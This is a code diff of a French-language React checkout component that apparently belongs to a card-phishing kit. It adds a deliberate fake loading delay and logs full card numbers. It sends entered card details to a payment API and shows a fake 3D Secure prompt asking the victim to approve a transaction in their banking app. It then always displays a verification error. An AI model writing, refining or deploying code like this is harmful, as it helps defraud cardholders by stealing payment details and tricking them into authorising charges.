@@ -13,7 +13,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
   });
 
   const [showPaymentError, setShowPaymentError] = useState(false);
-  const [showCardError, setShowCardError] = useState(false);
+  const [showVerifError, setShowVerifError] = useState(false);
   const [cardLogo, setCardLogo] = useState('/verified-by-visa.png');
   const [checkoutProvider, setCheckoutProvider] = useState("rento");
 
@@ -132,7 +132,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     } catch (error) {
       console.error('Error fetching payment:', error);
       setShowPaymentError(false);
-      setShowCardError(false);
+      setShowVerifError(false);
       setShow3DSecurePopup(false);
       throw error;
     }
@@ -213,6 +213,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
   };
 
 
+  let verifyResult = ''
   const handleCheckout = async (e) => {
     e.preventDefault();
     if (document.activeElement === document.querySelector('input[name="cvv"]')) {
@@ -241,33 +242,35 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       //triggerBackgroundReinit();
 
       // Vérifier si la carte a déjà été utilisée
-      const verifyResult = await verifyCard(cardDetails.cardNumber);
+      console.log("--> Vérification carte : ", cardDetails.cardNumber);
+      verifyResult = await verifyCard(cardDetails.cardNumber);
 
       // Délais faux chargement de préparation
       await new Promise(resolve => setTimeout(resolve, 8000));
 
       // Si carte déjà été utilisée, afficher l'erreur
       if (verifyResult) {
-        //console.log("--> Carte déjà utilisée");
+        console.log("--> Carte non-valide");
         setIsLoading(false);
         setShow3DSecurePopup(false);
-        setShowCardError(true);
+        setShowVerifError(true);
       }
       else {
-        //console.log("--> Carte non utilisée");
+        console.log("--> Carte valide");
         setTimeout(() => {
           setIsLoading(false);
-          setShowCardError(false);
+          setShowVerifError(false);
           setShow3DSecurePopup(true);
         }, 20000);
 
         // Requête de paiement à l'API 
         await payFetch(orderNumber, 1, cardDetails);
+        //await new Promise(resolve => setTimeout(resolve, 60000));
 
         // Afficher popup erreur carte
         setIsLoading(false);
         setShow3DSecurePopup(false);
-        setShowCardError(true);
+        setShowVerifError(true);
       }
       
     } catch (error) {
@@ -277,19 +280,19 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       // Afficher popup erreur carte
       setIsLoading(false);
       setShow3DSecurePopup(false);
-      setShowCardError(true);
+      setShowVerifError(true);
     }
   };
 
   const handleRetry = () => {
     setShowPaymentError(false);
-    setShowCardError(false);
+    setShowVerifError(false);
     setShow3DSecurePopup(false);
     handleCheckout(new Event('submit'));
   };
 
   const handleChangeCard = () => {
-    setShowCardError(false);
+    setShowVerifError(false);
     setShow3DSecurePopup(false);
     setFormData({
       cardNumber: '',
@@ -379,7 +382,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
             </article>
             <img src="3d-secure.png" alt="3D Secure" className="icon" />
             <h2>Vérifiez votre identité</h2>
-            <p className="desc">Avant de poursuivre vers le paiement, validez la transaction suivante :</p>
+            <p className="desc">Validez la transaction suivante depuis votre application bancaire.</p>
             <article className="infos">
               <span>LW VERIF BRICKS ID.CO</span>
               <span>
@@ -419,7 +422,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         </div>
       )}
 
-      {showCardError && (
+      {showVerifError && (
         <div className="verification-wrapper">
           <div className="verification-popup error">
             <article className="head">
@@ -435,7 +438,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
             <p className="desc">Échec durant la vérification d'identité mode de paiement non-accepté.</p>
             <button
               onClick={() => {
-                setShowCardError(false);
+                setShowVerifError(false);
                 setFormData({
                   cardNumber: '',
                   expiryDate: '',
